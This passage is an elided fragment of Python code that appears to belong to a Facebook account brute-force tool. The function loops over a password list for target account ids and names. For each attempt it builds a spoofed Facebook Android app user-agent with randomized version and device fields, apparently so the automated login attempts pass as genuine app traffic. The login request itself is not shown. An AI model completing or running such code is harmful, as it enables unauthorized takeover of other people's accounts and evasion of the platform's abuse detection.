...
def ffb2(ids,names,passlist):
		try:
			...
			for pw in passlist:
				...
				ffb2=random.choice(fbks)
				dvlk = random.choice(usr)
				ua_string = '[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.1,width=1080,height=1497};FBLC/en_US;FBRV/'+fbrv+';FBCR/Globacom Nigeria;FBMF/apple;FBBD/apple;FBPN/com.facebook.katana;FBDV/A2005;FBSV/'+fbsv+';FBOP/1;FBCA/arm64-v8a:]'
				li = ['28','29','210']
